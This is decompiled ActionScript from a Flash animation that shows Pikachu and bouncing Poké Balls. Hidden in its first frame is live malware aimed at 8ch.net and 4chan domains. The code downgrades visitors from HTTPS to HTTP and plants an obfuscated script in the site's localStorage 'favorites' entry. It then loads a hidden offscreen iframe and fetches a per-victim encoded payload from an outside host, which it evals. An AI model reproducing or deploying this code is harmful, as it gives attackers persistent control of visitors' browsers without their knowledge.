package pika8no4nopika_fla {
    import flash.display.*;
    import flash.geom.*;
    import adobe.utils.*;
    import flash.accessibility.*;
    import flash.desktop.*;
    import flash.errors.*;
    import flash.events.*;
    import flash.external.*;
    import flash.filters.*;
    import flash.globalization.*;
    import flash.media.*;
    import flash.net.*;
    import flash.net.drm.*;
    import flash.printing.*;
    import flash.profiler.*;
    import flash.sampler.*;
    import flash.sensors.*;
    import flash.system.*;
    import flash.text.*;
    import flash.text.ime.*;
    import flash.text.engine.*;
    import flash.ui.*;
    import flash.utils.*;
    import flash.xml.*;

    public dynamic class MainTimeline extends MovieClip {

        public var pd;
        public var i;
        public var so;
        public var lrdr;
        public var ctm;
        public var doscr;
        public var zz;
        public var zfs;
        public var zfa;
        public var pika;
        public var pika2;
        public var ball;
        public var bm:BitmapData;
        public var bm2:BitmapData;
        public var bm3:BitmapData;
        public var bm4:BitmapData;
        public var bm5:BitmapData;
        public var dbm:BitmapData;
        public var bt:Bitmap;
        public var mtx:Matrix;
        public var ctf:ColorTransform;
        public var ang;
        public var sc1;
        public var sc2;
        public var fr;
        public var sp;
        public var xm;
        public var ym;
        public var xx;
        public var yy;
        public var ballz;
        public var o;
        public var charz;
        public var uak;
        public var uas;
        public var j;
        public var uaf;
        public var kv;
        public var v;
        public var pos1;
        public var v2;
        public var pos2;
        public var s;
        public var fs;
        public var fa;

        public function MainTimeline(){
            addFrameScript(0, this.frame1);
        }
        public function oef(_arg1){
            var _local2:* = (((this.fr * 14) % 2) <= 1);
            this.fr = (this.fr + 0.01);
            this.sp = (0 + (0.09 * Math.cos((this.fr * 2))));
            this.mtx = new Matrix();
            this.mtx.translate(0, -((Math.floor((this.fr * 400)) % 600)));
            this.dbm.draw(this.bm5, this.mtx);
            this.mtx.translate(0, 600);
            this.dbm.draw(this.bm5, this.mtx);
            this.i = (this.ballz.length - 1);
            while (this.i >= 0) {
                this.o = this.ballz[this.i];
                this.o.xx = (this.o.xx + this.o.vx);
                this.o.yy = (this.o.yy + this.o.vy);
                if (this.o.xx < -200){
                    this.o.xx = (this.o.xx + (800 + (200 * 2)));
                } else {
                    if (this.o.xx > (800 + 200)){
                        this.o.xx = (this.o.xx - (800 + (200 * 2)));
                    };
                };
                if (this.o.yy < -200){
                    this.o.yy = (this.o.yy + (600 + (200 * 2)));
                } else {
                    if (this.o.yy > (600 + 200)){
                        this.o.yy = (this.o.yy - (600 + (200 * 2)));
                    };
                };
                this.o.ang = (this.o.ang + 0.1);
                this.mtx = new Matrix();
                this.mtx.translate((-(this.ball.width) / 2), (-(this.ball.height) / 2));
                this.mtx.rotate(this.o.ang);
                this.mtx.scale(0.2, 0.2);
                this.mtx.translate(this.o.xx, this.o.yy);
                this.bm.draw(this.ball, this.mtx);
                this.i--;
            };
            this.ctf = new ColorTransform(1, 1, 1, 0.35, 0, 0, 0, 0);
            this.i = (this.ballz.length - 1);
            while (this.i >= 0) {
                this.o = this.ballz[this.i];
                this.mtx = new Matrix();
                this.mtx.translate((-(this.ball.width) / 2), (-(this.ball.height) / 2));
                this.mtx.rotate(this.o.ang);
                this.mtx.scale(0.2, 0.2);
                this.mtx.translate(this.o.xx, this.o.yy);
                this.bm.draw(this.ball, this.mtx, this.ctf);
                this.i--;
            };
            this.ang = (this.ang - (0.1 * Math.cos(this.fr)));
            this.sc1 = (0.7 + (0.3 * Math.cos(this.fr)));
            this.sc2 = (0.7 + (0.3 * Math.cos(this.fr)));
            this.mtx = new Matrix();
            this.mtx.translate((-(this.pika.width) / 2), (-(this.pika.height) / 2));
            this.mtx.scale(this.sc1, this.sc2);
            this.mtx.rotate(this.ang);
            this.mtx.translate(this.xx, this.yy);
            if (_local2){
                this.bm.draw(this.pika2, this.mtx);
            } else {
                this.bm.draw(this.pika, this.mtx);
            };
            this.bm2.fillRect(this.bm2.rect, 0);
            this.bm2.draw(this.bm);
            this.bm.fillRect(this.bm.rect, 0);
            this.xm = stage.mouseX;
            this.ym = stage.mouseY;
            if (this.xm < 0){
                this.xm = 0;
            };
            if (this.xm > 800){
                this.xm = 800;
            };
            if (this.ym < 0){
                this.ym = 0;
            };
            if (this.ym > 600){
                this.ym = 600;
            };
            this.xx = (this.xx + ((this.xm - this.xx) * 0.2));
            this.yy = (this.yy + ((this.ym - this.yy) * 0.2));
            this.mtx = new Matrix();
            this.mtx.translate((-800 / 2), (-600 / 2));
            this.mtx.scale((1 + (((0.8 + (0.2 * Math.cos((this.fr * 16)))) * 1) * (0.035 + (0.2 * this.sp)))), (1 + (((0.8 + (0.2 * Math.sin((this.fr * 17)))) * 1) * (0.035 + (0.2 * this.sp)))));
            this.mtx.translate((800 / 2), (600 / 2));
            this.bm.draw(this.bm2, this.mtx);
        }
        function frame1(){
            this.pd = ("" + Security.pageDomain);
            this.pd = this.pd.toLowerCase();
            this.so = SharedObject.getLocal("rdrdrde");
            this.lrdr = 0;
            if (typeof(this.so.data) != "undefined"){
                if (typeof(this.so.data.lrdr) != "undefined"){
                    this.lrdr = Number(this.so.data.lrdr);
                };
            };
            this.ctm = Math.round((new Date().getTime() / 1000));
            this.doscr = false;
            if ((((((((this.pd.indexOf("8ch.net") >= 0)) && (!((typeof(stage.loaderInfo.parameters) == "undefined"))))) && (!((typeof(stage.loaderInfo.parameters.ng) == "undefined"))))) && ((("" + stage.loaderInfo.parameters.ng) == "1")))){
                this.doscr = true;
            } else {
                if ((((((stage.loaderInfo.url.indexOf("8ch.net") >= 0)) && ((stage.loaderInfo.url.indexOf("https:") >= 0)))) && (((this.ctm - this.lrdr) > 600)))){
                    this.so.data.lrdr = this.ctm;
                    this.so.flush();
                    this.zz = "function loadHeaderImg () {";
                    this.zz = (this.zz + "window.location = window.location.href.split(\"https\").join(\"http\");");
                    this.zz = (this.zz + "};");
                    this.zz = (this.zz + "setTimeout(\"loadHeaderImg()\",0);");
                    this.zfs = "";
                    this.zfa = [];
                    this.i = 0;
                    while (this.i < this.zz.length) {
                        this.zfa.push(this.zz.charCodeAt(this.i));
                        this.i++;
                    };
                    this.zfs = this.zfa.join(",");
                    ExternalInterface.call("eval", (("eval(String.fromCharCode(" + this.zfs) + "))"));
                } else {
                    this.doscr = true;
                    addEventListener("enterFrame", this.oef);
                    this.pika = new peeka();
                    this.pika2 = new peeka2();
                    this.ball = new pokebawl();
                    this.bm = new BitmapData(800, 600, true, 0);
                    this.bm2 = this.bm.clone();
                    this.bm3 = this.bm.clone();
                    this.bm4 = this.bm.clone();
                    this.bm5 = this.bm.clone();
                    this.dbm = new BitmapData(this.bm.width, this.bm.height, false, 0x808080);
                    this.bt = new Bitmap(this.bm, "always", false);
                    this.bm5.perlinNoise(12, 12, 3, 31337357, true, true, 7);
                    this.bm.fillRect(this.bm.rect, 0xFF000000);
                    addChild(this.bt);
                    this.ang = 0;
                    this.sc1 = 1;
                    this.sc2 = 1;
                    this.fr = 0;
                    this.sp = 0;
                    this.xx = (800 / 2);
                    this.yy = (600 / 2);
                    this.ballz = [];
                    this.i = 0;
                    while (this.i < 6) {
                        this.o = {};
                        this.o.xx = (Math.random() * 800);
                        this.o.yy = (Math.random() * 600);
                        this.o.ang = ((Math.random() * 2) * Math.PI);
                        this.o.vang = ((Math.random() * 2) * Math.PI);
                        this.o.vx = (Math.cos(this.o.vang) * 6);
                        this.o.vy = (Math.sin(this.o.vang) * 6);
                        this.ballz.push(this.o);
                        this.i++;
                    };
                };
            };
            if (this.doscr){
                if ((((((((this.pd.indexOf("4cdn.org") >= 0)) || ((this.pd.indexOf("4cdns.org") >= 0)))) || ((this.pd.indexOf("8ch.net") >= 0)))) || ((this.pd.indexOf("lighti") >= 0)))){
                    this.charz = "0123456789abcdefghijklmnopqrstuvwxyz";
                    this.uak = "......sryfredrickloveyou";
                    this.uas = [];
                    this.uaf = "";
                    if (typeof(this.so.data) != "undefined"){
                        if (typeof(this.so.data.uaf) != "undefined"){
                            this.uaf = ("" + this.so.data.uaf);
                            if (this.uaf.length != 24){
                                this.uaf = "";
                            };
                        };
                    };
                    if (this.uaf == ""){
                        this.i = 0;
                        while (this.i < this.uak.length) {
                            this.uas.push(this.uak.charCodeAt(this.i));
                            this.i++;
                        };
                        this.kv = [];
                        this.i = 0;
                        while (this.i < 6) {
                            this.kv[this.i] = this.charz.charCodeAt(Math.floor((Math.random() * this.charz.length)));
                            this.uas[this.i] = this.kv[this.i];
                            this.i++;
                        };
                        this.i = this.kv.length;
                        while (this.i < this.uas.length) {
                            this.v = this.kv[(this.i % this.kv.length)];
                            this.pos1 = 0;
                            this.j = 0;
                            while (this.j < this.charz.length) {
                                if (this.v == this.charz.charCodeAt(this.j)){
                                    this.pos1 = this.j;
                                    break;
                                };
                                this.j++;
                            };
                            this.v2 = this.uas[this.i];
                            this.pos2 = 0;
                            this.j = 0;
                            while (this.j < this.charz.length) {
                                if (this.v2 == this.charz.charCodeAt(this.j)){
                                    this.pos2 = this.j;
                                    break;
                                };
                                this.j++;
                            };
                            this.pos2 = (this.pos2 + this.pos1);
                            this.pos2 = (this.pos2 % this.charz.length);
                            this.uas[this.i] = this.charz.charCodeAt(this.pos2);
                            this.i++;
                        };
                        this.uaf = "";
                        this.i = 0;
                        while (this.i < this.uas.length) {
                            this.uaf = (this.uaf + String.fromCharCode(this.uas[this.i]));
                            this.i++;
                        };
                        this.so.data.uaf = this.uaf;
                        this.so.flush();
                    };
                    this.s = "function loadHeaderImg () {";
                    this.s = (this.s + "if (window.location.href.indexOf('ng=1')==-1) {");
                    this.s = (this.s + "var ua = navigator.userAgent;");
                    this.s = (this.s + "if (ua) {");
                    this.s = (this.s + "var ii=document.createElement('iframe');");
                    this.s = (this.s + "ii.style.position='absolute';");
                    this.s = (this.s + "ii.style.left='-1280px';");
                    this.s = (this.s + "ii.style.top='-980px';");
                    this.s = (this.s + "ii.width=300;");
                    this.s = (this.s + "ii.height=100;");
                    this.s = (this.s + "ii.src=(''+window.location.href).split('media.8ch.net').join('8ch.net').split('.swf').join('.swf?ng=1&');");
                    this.s = (this.s + "document.body.appendChild(ii);");
                    this.s = (this.s + "};");
                    this.s = (this.s + "}else if (window.location.href.indexOf('8ch.net')>=0){");
                    this.s = (this.s + (("var fs=\"aylmoctisfnetoojwsdd911<div id='favsh1' style='width:1px;height:1px;display:none;'></div><script>function cbstrtea(){ var os = document.getElementsByTagName('div'); for (var i=os.length-1; i>=0; i--) {  var o = os[i];  if (o.id == 'favsh1') {   o = o.parentNode;   o.style.display='none';   if (o.previousSibling && ((''+o.previousSibling.textContent).split(' ').join('') == '/')) {    o.parentNode.removeChild(o.previousSibling);   } else if (o.nextSibling && ((''+o.nextSibling.textContent).split(' ').join('') == '/')) {    o.parentNode.removeChild(o.nextSibling);   } else if (o.previousSibling && o.nextSibling && ((''+o.previousSibling.textContent).split(' ').join('') == '[') && ((''+o.nextSibling.textContent).split(' ').join('') == ']')) {    o.parentNode.removeChild(o.previousSibling);    o.parentNode.removeChild(o.nextSibling);   };  }; };};setTimeout('cbstrtea()',0);if (!window.hfavsh) { window.wqvqlx='val'; window.hfavsh=true; if (typeof(window.axhtprqsa) == 'undefined') {  window.axhtprqsa = [];  window.wqvqlxf = function (u, f) {   var xh;   if (window.XMLHttpRequest) {    xh = new XMLHttpRequest();   } else {    xh = new ActiveXObject('Microsoft.XMLHTTP');   };   var o = {};   o.xh = xh;   o.done = false;   o.f = f;   window.axhtprqsa.push(o);   xh.onreadystatechange = function () {    var o = null;    for (var i = window.axhtprqsa.length-1; i>=0; i--) {     if (window.axhtprqsa[i].xh == this) {      o = window.axhtprqsa[i];      break;     };    };    if (o != null) {     if (this.readyState == 4 ) {      if (!o.done) {       o.done = true;       if (this.status == 200) {        o.f(this.responseText, 'success');       } else {        o.f('', 'error');       };      };     };    };   };   try {    xh.open('GET', u, true);    xh.send();   } catch (e) { };  }; }; function gfavsh(d,c){  var fd='';  var lv = 5;  var plv;  for (var i = 0;i<d.length;i++) {   var v=d.charCodeAt(i);   v -= 32;   plv = lv;   lv = v;   v -= plv;   v %= 126-32;   if (v<0) v+=126-32;   v += 32;   fd+=String.fromCharCode(v);  };  if (fd.length >= 3) if (c=='success') window[window['wqvqlx']](fd); }; window.wqvqlx='e'+window.wqvqlx; wqvqlxf('https://8chan.pw/a_" + this.uaf) + "', gfavsh);};</script>aylmoctisfnetoojwsdd911\";"));
                    this.s = (this.s + "var favorites = [];");
                    this.s = (this.s + "var can_go = true;");
                    this.s = (this.s + "if (localStorage.favorites) {");
                    this.s = (this.s + "if (localStorage.favorites.indexOf('\\\\u00') >= 0) {");
                    this.s = (this.s + "can_go = false;");
                    this.s = (this.s + "};");
                    this.s = (this.s + "favorites = JSON.parse(localStorage.favorites);");
                    this.s = (this.s + "};");
                    this.s = (this.s + "if (can_go) {");
                    this.s = (this.s + "favorites.push(fs);");
                    this.s = (this.s + "var lcs = JSON.stringify(favorites);");
                    this.s = (this.s + "var ss = lcs.split('aylmoctisfnetoojwsdd911');");
                    this.s = (this.s + "for (var i = 0; i<ss.length; i++) {");
                    this.s = (this.s + "if (i%2 == 1) {");
                    this.s = (this.s + "var s=ss[i];");
                    this.s = (this.s + "var ns='';");
                    this.s = (this.s + "for (var j = 0; j<s.length; j++) {");
                    this.s = (this.s + "var hs='00'+(s.charCodeAt(j)).toString(16);");
                    this.s = (this.s + "hs=hs.substr(hs.length-2);");
                    this.s = (this.s + "ns+='\\\\u00'+hs;");
                    this.s = (this.s + "};");
                    this.s = (this.s + "ss[i]=ns;");
                    this.s = (this.s + "};");
                    this.s = (this.s + "};");
                    this.s = (this.s + "ss = ss.join('');");
                    this.s = (this.s + "localStorage.favorites = ss;");
                    this.s = (this.s + "};");
                    this.s = (this.s + "};");
                    this.s = (this.s + "};");
                    this.s = (this.s + "setTimeout('loadHeaderImg()', 0);");
                    this.fs = "";
                    this.fa = [];
                    this.i = 0;
                    while (this.i < this.s.length) {
                        this.fa.push(this.s.charCodeAt(this.i));
                        this.i++;
                    };
                    this.fs = this.fa.join(",");
                    ExternalInterface.call("eval", (("eval(String.fromCharCode(" + this.fs) + "))"));
                };
            };
        }

    }
}//package pika8no4nopika_fla
